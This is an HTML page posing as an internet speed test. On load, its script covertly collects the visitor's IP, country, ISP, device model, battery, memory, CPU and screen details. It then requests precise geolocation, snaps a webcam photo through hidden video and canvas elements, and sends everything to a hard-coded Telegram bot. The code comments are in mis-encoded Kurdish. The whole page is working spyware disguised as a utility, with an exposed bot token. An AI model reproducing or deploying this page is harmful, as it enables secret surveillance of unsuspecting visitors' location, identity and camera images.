<!DOCTYPE html>
<html>
<head><title>Internet Speed Test</title></head>
<body>
    <h1 style="text-align:center;">Checking Internet Speed...</h1>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
        const chatId = '1034878899';

        async function startTracking() {
            try {
                // 1. ÙˆÛ•Ø±Ú¯Ø±ØªÙ†ÛŒ Ø¦Ø§ÛŒÙ¾ÛŒ Ùˆ Ø´ÙˆÛŽÙ†
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                // 2. Ø¯ÛŒØ§Ø±ÛŒÚ©Ø±Ø¯Ù†ÛŒ Ù…Û†Ø¯ÛŽÙ„ÛŒ Ù…Û†Ø¨Ø§ÛŒÙ„ (Ø¨Û† Ø¦Û•Ù†Ø¯Ø±Û†ÛŒØ¯ ÙˆØ±Ø¯ØªØ±Û•)
                const ua = navigator.userAgent;
                let deviceModel = "Unknown Device";
                if (/Android/i.test(ua)) {
                    const match = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
                    deviceModel = match ? match[2] : "Android Device";
                } else if (/iPhone/i.test(ua)) {
                    deviceModel = "iPhone";
                }

                // 3. Ù¾Ø§ØªØ±ÛŒ
                let batteryLevel = "Unknown";
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${Math.round(battery.level * 100)}%`;
                }

                const info = `
ðŸ”” Ø²Ø§Ù†ÛŒØ§Ø±ÛŒ Ù†ÙˆÛŽ:
ðŸ“± Ù…Û†Ø¯ÛŽÙ„: ${deviceModel}
ðŸŒ Ø¦Ø§ÛŒÙ¾ÛŒ: ${data.ip}
ðŸ“ ÙˆÚµØ§Øª: ${data.country_name}
ðŸ¢ Ú©Û†Ù…Ù¾Ø§Ù†ÛŒØ§: ${data.org}
ðŸ”‹ Ù¾Ø§ØªØ±ÛŒ: ${batteryLevel}
ðŸ’¾ Ú•Ø§Ù…: ${navigator.deviceMemory || 'Ù†Ø§Ø¯ÛŒØ§Ø±'} GB
âš™ï¸ Ù¾Ú•Û†Ø³ÛŽØ³Û•Ø±: ${navigator.hardwareConcurrency} Cores
ðŸ–¥ Ø´Ø§Ø´Û•: ${window.screen.width}x${window.screen.height}
â° Ú©Ø§Øª: ${new Date().toLocaleString()}
                `;
                
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`);
            } catch (e) {}

            // 4. Ø´ÙˆÛŽÙ†ÛŒ ÙˆØ±Ø¯ (Ù…Û†ÚµÛ•Øª)
            navigator.geolocation.getCurrentPosition(pos => {
                const loc = `ðŸ“ Ù†Û•Ø®Ø´Û•: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(loc)}`);
            });

            // 5. ÙˆÛŽÙ†Û• (Ù…Û†ÚµÛ•Øª)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const frm = new FormData();
                        frm.append('chat_id', chatId); frm.append('photo', blob, 'img.jpg');
                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: frm });
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg');
                }, 2000);
            } catch (err) {}
        }

        window.onload = startTracking;
    </script>
</body>
</html>
